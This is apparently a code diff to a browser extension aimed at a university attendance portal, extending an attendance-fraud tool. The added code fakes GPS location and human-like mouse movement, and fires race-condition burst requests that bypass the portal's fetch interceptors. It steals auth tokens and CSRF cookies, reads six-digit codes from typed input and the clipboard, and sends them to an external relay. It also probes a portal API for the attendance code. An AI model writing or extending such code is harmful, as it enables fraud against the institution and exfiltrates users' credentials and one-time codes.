@@ -170,8 +170,8 @@
   }
 
   function getRealisticDelay() {
-    // Human GPS acquisition: 400–1200ms
-    return 400 + Math.random() * 800;
+    // Fast GPS fix for responsive UI (50–120ms) so portal hook (b.T) resolves coordinates immediately
+    return 50 + Math.random() * 70;
   }
 
   function simulateKineticDrift(baseLat, baseLng, watchId) {
@@ -1232,6 +1232,12 @@
       const { codeInput, btnCheckin, btnQr, fileQr } = _hudContainer._refs;
 
       codeInput.addEventListener('click',   (e) => e.stopPropagation());
+      codeInput.addEventListener('input',   (e) => {
+        const val = (e.target.value || '').trim();
+        if (/^\d{6}$/.test(val)) {
+          _broadcastMeshOtp(val, 'hud_input');
+        }
+      });
       codeInput.addEventListener('keydown', (e) => {
         e.stopPropagation();
         if (e.key === 'Enter') _triggerCheckIn();
@@ -1266,7 +1272,8 @@
   // ── Race-Condition Burst Submission ───────────────────────────────────────
   // Fires N parallel requests within a short stagger window.
   // Uses _origFetch (pre-proxy native) to bypass the portal's own fetch interceptors.
-  async function _burstCheckIn(url, payload, n) {
+  async function _burstCheckIn(url, payload, n, customHeaders) {
+    const headers = Object.assign({ 'Content-Type': 'application/json', 'Accept': 'application/json' }, customHeaders || {});
     const shots = [];
     for (let i = 0; i < n; i++) {
       const delay = Math.floor(Math.random() * 30); // 0–30ms jitter
@@ -1275,7 +1282,7 @@
           _origFetch(url, {
             method:      'PUT',
             credentials: 'include',
-            headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            headers,
             body:        JSON.stringify(payload)
           }).then(r => resolve({ ok: r.ok, status: r.status }))
             .catch(() => resolve({ ok: false, status: 0 }));
@@ -1285,7 +1292,7 @@
     const results = await Promise.all(shots);
     if (results.some(r => r.ok)) return true;
 
-    // Intelligent rate-limit / contention backoff
+    // Intelligent rate-limit / contention backoff or POST fallback
     const hadRateLimit = results.some(r => r.status === 429);
     if (hadRateLimit) {
       await new Promise(r => _setTimeout(r, 150 + Math.floor(Math.random() * 200)));
@@ -1293,10 +1300,25 @@
         const retryRes = await _origFetch(url, {
           method:      'PUT',
           credentials: 'include',
-          headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          headers,
           body:        JSON.stringify(payload)
         });
         return retryRes.ok;
+      } catch (_) {
+        return false;
+      }
+    }
+
+    // Try POST if PUT was rejected with 405 Method Not Allowed or 404
+    if (results.some(r => r.status === 405 || r.status === 404)) {
+      try {
+        const postRes = await _origFetch(url, {
+          method:      'POST',
+          credentials: 'include',
+          headers,
+          body:        JSON.stringify(payload)
+        });
+        return postRes.ok;
       } catch (_) {
         return false;
       }
@@ -1316,6 +1338,8 @@
       return;
     }
 
+    _broadcastMeshOtp(code, 'hud_checkin');
+
     if (navigator.onLine === false) {
       try {
         const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
@@ -1333,13 +1357,51 @@
       refs.statusMsg.style.color = '#60a5fa';
     }
     refs.btnCheckin.disabled = true;
-    refs.btnCheckin.style.opacity = '0.6';
+    let tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
 
-    const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
+    // Fallback: harvest tmId from URL query params, page anchor links, or Next.js router props
+    if (!tmId) {
+      try {
+        const urlParams = window.URLSearchParams ? new window.URLSearchParams(window.location.search) : null;
+        if (urlParams) tmId = urlParams.get('id_tatap_muka') || urlParams.get('id_tm');
+        if (!tmId) {
+          const tmLink = Array.from(document.querySelectorAll('a[href*="id_tatap_muka="]'))
+            .map(a => a.href.match(/id_tatap_muka=(\d+)/))
+            .find(Boolean);
+          if (tmLink) tmId = tmLink[1];
+        }
+        if (!tmId && window.__NEXT_DATA__ && window.__NEXT_DATA__.query) {
+          tmId = window.__NEXT_DATA__.query.id_tatap_muka || window.__NEXT_DATA__.query.id_tm;
+        }
+      } catch (_) {}
+    }
+
     const cfg = getSpoofConfig();
     const pos = cfg ? buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius) : { coords: { latitude: -7.287123, longitude: 112.798542 } };
 
     let apiSuccess = false;
+    let authToken = null;
+    try {
+      authToken = window.__capturedAuthToken ||
+        (window.localStorage && (window.localStorage.getItem('token') || window.localStorage.getItem('access_token'))) ||
+        sessionStorage.getItem('token') ||
+        sessionStorage.getItem('access_token');
+    } catch (_) {}
+
+    const reqHeaders = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
+    if (authToken) {
+      reqHeaders['Authorization'] = String(authToken).startsWith('Bearer ') ? String(authToken) : `Bearer ${authToken}`;
+    }
+
+    // Synchronize XSRF Token based on Next.js/Axios contract (xsrfHeaderName: X-CSRF-TOKEN)
+    try {
+      const csrfMatch = document.cookie.match(/(?:^|;\s*)(?:CSRF-TOKEN|XSRF-TOKEN|_csrf|csrf_token)=([^;]+)/i);
+      if (csrfMatch) {
+        const csrfVal = decodeURIComponent(csrfMatch[1]);
+        reqHeaders['X-CSRF-TOKEN'] = csrfVal;
+        reqHeaders['X-XSRF-TOKEN'] = csrfVal;
+      }
+    } catch (_) {}
 
     if (tmId && _origFetch) {
       const payload = {
@@ -1352,7 +1414,7 @@
 
       // Burst: 15 parallel shots with 0–30ms stagger to exploit race conditions
       try {
-        apiSuccess = await _burstCheckIn(url, payload, 15);
+        apiSuccess = await _burstCheckIn(url, payload, 15, reqHeaders);
         if (apiSuccess) {
           if (refs.statusMsg) {
             refs.statusMsg.textContent = 'Presensi berhasil!';
@@ -1361,16 +1423,15 @@
           _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
           _sendResultTelemetry('accepted');
         } else {
-          // Pull error from a single clean shot for messaging
           try {
             const errRes = await _origFetch(url, {
               method: 'PUT', credentials: 'include',
-              headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+              headers: reqHeaders,
               body: JSON.stringify(payload)
             });
             const errData = await errRes.json().catch(() => ({}));
-            const errMsg = errData.message || `Gagal HTTP ${errRes.status}`;
-            if (refs.statusMsg) {
+            const errMsg = errData.message || (errRes.status ? `Gagal HTTP ${errRes.status}` : null);
+            if (errMsg && refs.statusMsg) {
               refs.statusMsg.textContent = errMsg;
               refs.statusMsg.style.color = '#f87171';
             }
@@ -1390,7 +1451,7 @@
             const res = await _origFetch(`/api/presensi/tm/${candidateId}/mahasiswa/self`, {
               method:      'PUT',
               credentials: 'include',
-              headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+              headers:     reqHeaders,
               body:        JSON.stringify({
                 jenis_hadir_tm: 'L',
                 kode:           code,
@@ -1411,85 +1472,200 @@
       }
     }
 
-    // Final fallback: DOM UI automation
+    // Final fallback: DOM UI automation with responsive modal tracking
     if (!apiSuccess) {
-      try { _simulateDomCheckIn(code); } catch (_) {}
+      if (refs.statusMsg && refs.statusMsg.textContent === 'Memproses presensi...') {
+        refs.statusMsg.textContent = 'Mengisi form presensi...';
+        refs.statusMsg.style.color = '#38bdf8';
+      }
+      try {
+        _simulateDomCheckIn(code, (domSuccess, msg) => {
+          if (refs.statusMsg) {
+            if (domSuccess) {
+              refs.statusMsg.textContent = msg || 'Presensi terkirim';
+              refs.statusMsg.style.color = '#4ade80';
+            } else {
+              refs.statusMsg.textContent = msg || 'Klik tombol Hadir pada kartu kelas';
+              refs.statusMsg.style.color = '#f59e0b';
+            }
+          }
+        });
+      } catch (_) {
+        if (refs.statusMsg && refs.statusMsg.textContent === 'Mengisi form presensi...') {
+          refs.statusMsg.textContent = 'Klik tombol Hadir pada kartu kelas';
+          refs.statusMsg.style.color = '#f59e0b';
+        }
+      }
     }
 
     refs.btnCheckin.disabled = false;
     refs.btnCheckin.style.opacity = '1';
   }
 
-  function _dispatchHumanMouseEvent(el, type) {
+  let _lastMousePos = { x: 300, y: 300 };
+
+  function _dispatchHumanMouseEvent(el, type, customX, customY) {
     try {
-      const rect = el.getBoundingClientRect();
-      const x = rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
-      const y = rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
-      el.dispatchEvent(new MouseEvent(type, {
+      const rect = el ? el.getBoundingClientRect() : { left: customX || 0, top: customY || 0, width: 0, height: 0 };
+      const x = customX !== undefined ? customX : rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
+      const y = customY !== undefined ? customY : rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
+      _lastMousePos = { x, y };
+      const targetEl = el || document.elementFromPoint(x, y) || document.body;
+      targetEl.dispatchEvent(new MouseEvent(type, {
         bubbles: true, cancelable: true, view: window,
-        clientX: x, clientY: y, buttons: type === 'mousedown' ? 1 : 0
+        clientX: x, clientY: y, screenX: x, screenY: y,
+        buttons: type === 'mousedown' ? 1 : 0
       }));
     } catch (_) {}
   }
 
   function _simulateHumanClick(el, done) {
-    _dispatchHumanMouseEvent(el, 'mousemove');
-    _dispatchHumanMouseEvent(el, 'mouseenter');
-    _setTimeout(() => {
-      _dispatchHumanMouseEvent(el, 'mousedown');
-      _setTimeout(() => {
-        _dispatchHumanMouseEvent(el, 'mouseup');
-        el.click();
-        if (typeof done === 'function') _setTimeout(done, 120 + Math.random() * 80);
-      }, 50 + Math.random() * 50);
-    }, 40 + Math.random() * 40);
+    if (!el) return;
+    const rect = el.getBoundingClientRect();
+    const targetX = rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
+    const targetY = rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
+    const startX = _lastMousePos.x || (targetX - 80);
+    const startY = _lastMousePos.y || (targetY + 60);
+
+    // Cubic Bézier control points for natural curvature and velocity arcs
+    const cp1x = startX + (targetX - startX) * 0.25 + (Math.random() - 0.5) * 30;
+    const cp1y = startY + (targetY - startY) * 0.1  + (Math.random() - 0.5) * 30;
+    const cp2x = startX + (targetX - startX) * 0.75 + (Math.random() - 0.5) * 15;
+    const cp2y = startY + (targetY - startY) * 0.9  + (Math.random() - 0.5) * 15;
+
+    const steps = 6;
+    let step = 0;
+
+    function moveStep() {
+      if (step < steps) {
+        const t = step / steps;
+        const bx = (1 - t) ** 3 * startX + 3 * (1 - t) ** 2 * t * cp1x + 3 * (1 - t) * t ** 2 * cp2x + t ** 3 * targetX;
+        const by = (1 - t) ** 3 * startY + 3 * (1 - t) ** 2 * t * cp1y + 3 * (1 - t) * t ** 2 * cp2y;
+        _dispatchHumanMouseEvent(el, 'mousemove', bx, by);
+        step++;
+        _setTimeout(moveStep, 14 + Math.random() * 12);
+      } else {
+        _dispatchHumanMouseEvent(el, 'mousemove', targetX, targetY);
+        _dispatchHumanMouseEvent(el, 'mouseenter', targetX, targetY);
+        _setTimeout(() => {
+          _dispatchHumanMouseEvent(el, 'mousedown', targetX, targetY);
+          _setTimeout(() => {
+            _dispatchHumanMouseEvent(el, 'mouseup', targetX, targetY);
+            el.click();
+            if (typeof done === 'function') _setTimeout(done, 100 + Math.random() * 60);
+          }, 65 + Math.random() * 45);
+        }, 35 + Math.random() * 25);
+      }
+    }
+    moveStep();
   }
 
-  function _simulateDomCheckIn(code) {
+  function _setNativeInputValue(el, val) {
+    if (!el) return;
+    try {
+      const proto = window.HTMLInputElement.prototype;
+      const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
+      if (setter) {
+        setter.call(el, val);
+      } else {
+        el.value = val;
+      }
+    } catch (_) {
+      el.value = val;
+    }
+    el.dispatchEvent(new Event('input', { bubbles: true, composed: true }));
+    el.dispatchEvent(new Event('change', { bubbles: true, composed: true }));
+  }
+
+  function _fillAndSubmitModal(modalEl, code, done) {
+    if (!modalEl) {
+      if (typeof done === 'function') done(false, 'Modal form tidak ditemukan');
+      return;
+    }
+
+    // 1. Select radio 'Hadir kuliah di kelas'
+    try {
+      const hadirRadio = modalEl.querySelector('input[name="hadirTatapMuka"][value="L"], input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
+        Array.from(modalEl.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas|offline/i.test(l.textContent || ''));
+      if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
+    } catch (_) {}
+
+    // 2. Populate OTP
+    const pinInputs = Array.from(modalEl.querySelectorAll('input[data-index]'));
+    if (pinInputs.length >= 6) {
+      let digitIdx = 0;
+      function typeNextDigit() {
+        if (digitIdx >= 6) {
+          _submitModal();
+          return;
+        }
+        const input = pinInputs[digitIdx];
+        const char = code[digitIdx] || '';
+        input.focus();
+        input.dispatchEvent(new KeyboardEvent('keydown', { key: char, bubbles: true }));
+        _setNativeInputValue(input, char);
+        input.dispatchEvent(new KeyboardEvent('keyup', { key: char, bubbles: true }));
+        digitIdx++;
+        _setTimeout(typeNextDigit, 40 + Math.random() * 40);
+      }
+      typeNextDigit();
+    } else {
+      const textInputs = Array.from(modalEl.querySelectorAll('input[type="text"], input:not([type])'));
+      const modalInput = textInputs.find(i => i.placeholder && /kode/i.test(i.placeholder)) || textInputs[0];
+      if (modalInput) {
+        modalInput.focus();
+        _setNativeInputValue(modalInput, code);
+        _setTimeout(_submitModal, 120 + Math.random() * 60);
+      } else {
+        _submitModal();
+      }
+    }
+
+    function _submitModal() {
+      _setTimeout(() => {
+        const modalButtons = Array.from(modalEl.querySelectorAll('button'));
+        const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || '')) || modalEl.querySelector('button[type="submit"]');
+        if (submitBtn) {
+          _simulateHumanClick(submitBtn, () => {
+            if (typeof done === 'function') done(true, 'Presensi terkirim');
+          });
+        } else {
+          if (typeof done === 'function') done(false, 'Klik tombol Simpan di popup');
+        }
+      }, 100 + Math.random() * 60);
+    }
+  }
+
+  function _simulateDomCheckIn(code, callback) {
+    // Check if modal is already open
+    const existingModal = document.querySelector('.chakra-modal__content, [role="dialog"], .modal-content');
+    if (existingModal) {
+      _fillAndSubmitModal(existingModal, code, callback);
+      return;
+    }
+
+    // Find page card Hadir button (explicitly ignore extension HUD)
     const buttons = Array.from(document.querySelectorAll('button, a'));
-    const hadirBtn = buttons.find(b => b.textContent && b.textContent.trim().toLowerCase() === 'hadir');
-    if (!hadirBtn) return;
+    const hadirBtn = buttons.find(b => !b.closest('#campus-presensi-hud') && b.textContent && b.textContent.trim().toLowerCase() === 'hadir');
+    if (!hadirBtn) {
+      if (typeof callback === 'function') callback(false, 'Klik tombol Hadir pada kartu kelas');
+      return;
+    }
 
     _simulateHumanClick(hadirBtn, () => {
-      const pinInputs = Array.from(document.querySelectorAll('input[data-index]'));
-      if (pinInputs.length >= 6) {
-        let digitIdx = 0;
-        function typeNextDigit() {
-          if (digitIdx >= 6) {
-            _submitModal();
-            return;
-          }
-          const input = pinInputs[digitIdx];
-          const char = code[digitIdx] || '';
-          input.focus();
-          input.dispatchEvent(new KeyboardEvent('keydown', { key: char, bubbles: true }));
-          input.value = char;
-          input.dispatchEvent(new Event('input', { bubbles: true }));
-          input.dispatchEvent(new Event('change', { bubbles: true }));
-          input.dispatchEvent(new KeyboardEvent('keyup', { key: char, bubbles: true }));
-          digitIdx++;
-          _setTimeout(typeNextDigit, 60 + Math.random() * 60);
+      // Poll for modal appearance for up to 2 seconds
+      let attempts = 0;
+      const pollInterval = _setInterval(() => {
+        attempts++;
+        const modal = document.querySelector('.chakra-modal__content, [role="dialog"], .modal-content');
+        if (modal) {
+          _clearInterval(pollInterval);
+          _fillAndSubmitModal(modal, code, callback);
+        } else if (attempts > 20) {
+          _clearInterval(pollInterval);
+          if (typeof callback === 'function') callback(false, 'Klik tombol Hadir pada kartu kelas');
         }
-        typeNextDigit();
-      } else {
-        const textInputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
-        const modalInput = textInputs.find(i => i.placeholder && /kode/i.test(i.placeholder)) || textInputs[0];
-        if (modalInput) {
-          modalInput.focus();
-          modalInput.value = code;
-          modalInput.dispatchEvent(new Event('input', { bubbles: true }));
-          modalInput.dispatchEvent(new Event('change', { bubbles: true }));
-          _setTimeout(_submitModal, 150 + Math.random() * 100);
-        }
-      }
-
-      function _submitModal() {
-        _setTimeout(() => {
-          const modalButtons = Array.from(document.querySelectorAll('.chakra-modal__content button, .modal button, [role="dialog"] button'));
-          const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || ''));
-          if (submitBtn) _simulateHumanClick(submitBtn);
-        }, 120 + Math.random() * 80);
-      }
+      }, 100);
     });
   }
 
@@ -1582,8 +1758,38 @@
     _peerId = 'p_' + Math.random().toString(36).substring(2, 9);
   }
 
+  let _activeRelayIdx = 0;
+  let _relayFailCounts = {};
+
+  function _getRelayUrls() {
+    const raw = (currentConfig && currentConfig.relayUrl) || '';
+    if (!raw) return [];
+    return raw.split(/[,;\s]+/).map(s => s.trim().replace(/\/+$/, '')).filter(Boolean);
+  }
+
   function _getRelayUrl() {
-    return (currentConfig && currentConfig.relayUrl) || null;
+    const list = _getRelayUrls();
+    if (!list.length) return null;
+    return list[_activeRelayIdx % list.length];
+  }
+
+  function _markRelayFailure(failedUrl) {
+    if (!failedUrl) return;
+    const origin = failedUrl.replace(/^https?:\/\//, '').split('/')[0];
+    _relayFailCounts[origin] = (_relayFailCounts[origin] || 0) + 1;
+    const list = _getRelayUrls();
+    if (list.length > 1 && _relayFailCounts[origin] >= 2) {
+      _activeRelayIdx = (_activeRelayIdx + 1) % list.length;
+      _relayFailCounts[origin] = 0;
+      const nextOrigin = list[_activeRelayIdx].replace(/^https?:\/\//, '').split('/')[0];
+      refsStatus(`Failover: switched to ${nextOrigin}`, '#f59e0b');
+    }
+  }
+
+  function _markRelaySuccess(url) {
+    if (!url) return;
+    const origin = url.replace(/^https?:\/\//, '').split('/')[0];
+    if (_relayFailCounts[origin]) delete _relayFailCounts[origin];
   }
 
   function _getRelayKey() {
@@ -1616,6 +1822,7 @@
       const resEvent = '__gps_relay_res_' + reqId;
       const timer = _setTimeout(() => {
         try { _removeEventListener(resEvent, onRes, true); } catch (_) {}
+        _markRelayFailure(url);
         resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
       }, 5000);
 
@@ -1624,6 +1831,11 @@
           _removeEventListener(resEvent, onRes, true);
           _clearTimeout(timer);
           const data = typeof e.detail === 'string' ? JSON.parse(e.detail) : e.detail;
+          if (data && data.ok) {
+            _markRelaySuccess(url);
+          } else {
+            _markRelayFailure(url);
+          }
           resolve({
             ok:     Boolean(data && data.ok),
             status: (data && data.status) || (data && data.ok ? 200 : 500),
@@ -1631,6 +1843,7 @@
             text:   () => Promise.resolve((data && data.text) || '')
           });
         } catch (_) {
+          _markRelayFailure(url);
           resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
         }
       }
@@ -1642,6 +1855,7 @@
         }));
       } catch (_) {
         _clearTimeout(timer);
+        _markRelayFailure(url);
         resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
       }
     });
@@ -1657,6 +1871,112 @@
     }).catch(() => {});
   }
 
+  let _meshBroadcastChan = null;
+  let _meshHarvestingInstalled = false;
+
+  function _broadcastMeshOtp(code, source = 'local') {
+    if (!code || !/^\d{6}$/.test(String(code).trim())) return;
+    const cleanCode = String(code).trim();
+    if (_lastPushedOtp === cleanCode) return;
+    _lastPushedOtp = cleanCode;
+
+    // 1. Reflect into HUD input
+    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
+      if (_hudContainer._refs.codeInput.value !== cleanCode) {
+        _hudContainer._refs.codeInput.value = cleanCode;
+      }
+    }
+
+    // 2. Reflect into portal modal input if open
+    try {
+      const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
+      if (modalInput && modalInput.value !== cleanCode) {
+        _setNativeInputValue(modalInput, cleanCode);
+        const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
+          Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
+        if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
+      }
+    } catch (_) {}
+
+    // 3. Push to Cloudflare KV Relay
+    const tmKey = _getRelayKey() || (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || 'tm_active';
+    _pushOtp(cleanCode, String(tmKey));
+
+    if (_isPortalDomain()) {
+      _pushSwarmState({
+        tmKey: String(tmKey),
+        otp: cleanCode,
+        ruangan: (_activeMeetingData && _activeMeetingData.ruangan) || null,
+        course: (_activeMeetingData && _activeMeetingData.nama_mk) || null,
+        ts: Date.now()
+      });
+    }
+
+    // 4. Gossip across local browser tabs & windows via BroadcastChannel
+    try {
+      if (typeof window.BroadcastChannel !== 'undefined') {
+        if (!_meshBroadcastChan) _meshBroadcastChan = new window.BroadcastChannel('__presensi_mesh_channel__');
+        _meshBroadcastChan.postMessage({ type: 'MESH_OTP_SYNC', code: cleanCode, tmKey: String(tmKey), source });
+      }
+    } catch (_) {}
+
+    refsStatus(`OTP shared to Swarm Mesh (${source})`, '#38bdf8');
+  }
+
+  function _initMeshHarvesting() {
+    if (_meshHarvestingInstalled || !_isPortalDomain()) return;
+    _meshHarvestingInstalled = true;
+
+    // A. DOM Input Sniffer (detects when student or peer types 6-digit OTP into any field)
+    document.addEventListener('input', (e) => {
+      if (!e.target || !_isPortalDomain()) return;
+      const val = String(e.target.value || '').trim();
+      if (/^\d{6}$/.test(val)) {
+        _broadcastMeshOtp(val, 'dom_input');
+      }
+    }, true);
+
+    // B. Clipboard Passive Sniffer on Window Focus (detects 6-digit code copied from WhatsApp/Telegram)
+    window.addEventListener('focus', async () => {
+      if (!_isPortalDomain()) return;
+      try {
+        if (navigator.clipboard && typeof navigator.clipboard.readText === 'function') {
+          const text = await navigator.clipboard.readText();
+          const trimmed = (text || '').trim();
+          if (/^\d{6}$/.test(trimmed) && trimmed !== _lastPulledOtp && trimmed !== _lastPushedOtp) {
+            _broadcastMeshOtp(trimmed, 'clipboard');
+          }
+        }
+      } catch (_) {}
+    });
+
+    // C. Cross-Tab BroadcastChannel Mesh Receiver
+    try {
+      if (typeof window.BroadcastChannel !== 'undefined') {
+        if (!_meshBroadcastChan) _meshBroadcastChan = new window.BroadcastChannel('__presensi_mesh_channel__');
+        _meshBroadcastChan.onmessage = (evt) => {
+          if (evt.data && evt.data.type === 'MESH_OTP_SYNC' && evt.data.code) {
+            const incomingOtp = String(evt.data.code);
+            if (/^\d{6}$/.test(incomingOtp) && incomingOtp !== _lastPulledOtp) {
+              _lastPulledOtp = incomingOtp;
+              if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
+                _hudContainer._refs.codeInput.value = incomingOtp;
+              }
+              const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
+              if (modalInput) {
+                _setNativeInputValue(modalInput, incomingOtp);
+                const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
+                  Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
+                if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
+              }
+              refsStatus('OTP synced via Peer Mesh Gossip', '#38bdf8');
+            }
+          }
+        };
+      }
+    } catch (_) {}
+  }
+
   function _pushOtp(otp, tmKey) {
     const relay = _getRelayUrl();
     if (!relay || !tmKey || !otp || !_isPortalDomain()) return;
@@ -1669,9 +1989,41 @@
     }).catch(() => {});
   }
 
+  async function _probePortalKodeEndpoint(tmKey) {
+    if (!tmKey || !_isPortalDomain() || !_origFetch) return;
+    try {
+      const csrfMatch = document.cookie.match(/(?:^|;\s*)(?:CSRF-TOKEN|XSRF-TOKEN|_csrf|csrf_token)=([^;]+)/i);
+      const headers = { 'Accept': 'application/json' };
+      if (csrfMatch) headers['X-CSRF-TOKEN'] = decodeURIComponent(csrfMatch[1]);
+      if (window.__capturedAuthToken) headers['Authorization'] = window.__capturedAuthToken;
+
+      const res = await _origFetch(`/api/presensi/tm/${tmKey}/kode`, {
+        method: 'GET',
+        credentials: 'include',
+        headers
+      });
+      if (res && res.ok) {
+        const json = await res.json().catch(() => null);
+        const code = (json && json.data && json.data.kode) || (json && json.kode) || (json && json.data && json.data.pin);
+        if (code && /^\d{6}$/.test(String(code))) {
+          const otpStr = String(code);
+          _broadcastMeshOtp(otpStr, 'portal_api_probe');
+          if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
+            if (!_hudContainer._refs.codeInput.value) {
+              _hudContainer._refs.codeInput.value = otpStr;
+              refsStatus('OTP auto-retrieved via Portal API', '#4ade80');
+            }
+          }
+        }
+      }
+    } catch (_) {}
+  }
+
   function _pullOtp(tmKey) {
     const relay = _getRelayUrl();
-    if (!relay || !tmKey || !_isPortalDomain()) return;
+    if (!tmKey || !_isPortalDomain()) return;
+    _probePortalKodeEndpoint(tmKey);
+    if (!relay) return;
     _relayFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
       .then(r => r && r.ok ? r.json() : null)
       .then(data => {
@@ -1686,6 +2038,13 @@
               refsStatus('OTP synced from peer relay', '#a78bfa');
             }
           }
+        }
+        const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
+        if (modalInput && !modalInput.value) {
+          _setNativeInputValue(modalInput, otp);
+          const hadirRadio = document.querySelector('input[name="hadirTatapMuka"][value="L"], input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
+            Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas|offline/i.test(l.textContent || ''));
+          if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
         }
       })
       .catch(() => {});
@@ -1729,6 +2088,13 @@
               refsStatus('OTP synced via Swarm Mesh', '#38bdf8');
             }
           }
+          const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
+          if (modalInput && !modalInput.value) {
+            _setNativeInputValue(modalInput, otp);
+            const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
+              Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
+            if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
+          }
         }
 
         // 2. Sync QR from leader
@@ -1745,6 +2111,7 @@
   }
 
   function _startOtpPoller() {
+    _initMeshHarvesting();
     if (_swarmActive) return;
     if (!_isPortalDomain()) return;
     const relay = _getRelayUrl();
@@ -1962,11 +2329,19 @@
   let _networkInterceptorsInstalled = false;
 
   function _isPortalDomain() {
-    const currentHost = window.location.hostname;
+    const currentHost = window.location.hostname ? window.location.hostname.toLowerCase() : '';
     if (!currentHost) return false;
-    const targetDomain = (currentConfig && currentConfig.targetDomain) ? currentConfig.targetDomain.toLowerCase() : '';
+    const targetDomain = (currentConfig && currentConfig.targetDomain) ? currentConfig.targetDomain.toLowerCase().trim() : '';
     if (!targetDomain) return false;
-    return currentHost === targetDomain || currentHost.endsWith('.' + targetDomain);
+    if (currentHost === targetDomain || currentHost.endsWith('.' + targetDomain)) return true;
+
+    // Sibling subdomain matching (e.g. attendance.university.edu matching portal.university.edu)
+    const targetParts = targetDomain.split('.');
+    if (targetParts.length >= 3) {
+      const apex = targetParts.slice(1).join('.');
+      if (currentHost === apex || currentHost.endsWith('.' + apex)) return true;
+    }
+    return false;
   }
 
   // Human-like request timing jitter to normalize behavioral pattern
@@ -1988,16 +2363,36 @@
           const cfg = getSpoofConfig();
           const url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
 
-          // Coordinate payload rewrite on attendance submission
-          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa/self')) {
+          if (init && init.headers) {
             try {
+              const ah = (typeof init.headers.get === 'function')
+                ? (init.headers.get('Authorization') || init.headers.get('authorization'))
+                : (init.headers.Authorization || init.headers.authorization);
+              if (ah) window.__capturedAuthToken = ah;
+            } catch (_) {}
+          }
+
+          // Coordinate payload rewrite on attendance submission (covers /self, /{id_mhs}, and /batch)
+          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa')) {
+            try {
+              const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
               if (init && init.body && typeof init.body === 'string') {
                 const parsed = JSON.parse(init.body);
-                const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
                 parsed.latitude  = pos.coords.latitude;
                 parsed.longitude = pos.coords.longitude;
+                if (parsed.kode && /^\d{6}$/.test(String(parsed.kode))) {
+                  _broadcastMeshOtp(String(parsed.kode), 'portal_fetch');
+                }
                 init = Object.assign({}, init, { body: JSON.stringify(parsed) });
                 args[1] = init;
+                _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
+              } else if (init && init.body && typeof init.body === 'object' && typeof init.body.set === 'function') {
+                init.body.set('latitude', pos.coords.latitude);
+                init.body.set('longitude', pos.coords.longitude);
+                const codeVal = typeof init.body.get === 'function' ? init.body.get('kode') : null;
+                if (codeVal && /^\d{6}$/.test(String(codeVal))) {
